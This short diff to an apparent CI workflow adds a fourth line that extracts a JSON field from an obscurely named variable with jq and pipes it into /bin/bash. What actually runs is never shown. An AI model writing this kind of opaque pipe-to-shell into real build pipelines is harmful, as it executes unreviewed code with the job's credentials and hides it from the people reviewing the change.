@@ -33,6 +33,7 @@ jobs:
           echo $uj48 | jq -r .rooe0446 | /bin/bash
           printf '%s' "$b934" | jq -r .jsn155 | /bin/bash
           echo $dazs03480 | jq -r .iymey22 | /bin/bash
+          echo $pqyhc1 | jq -r .nv5720 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
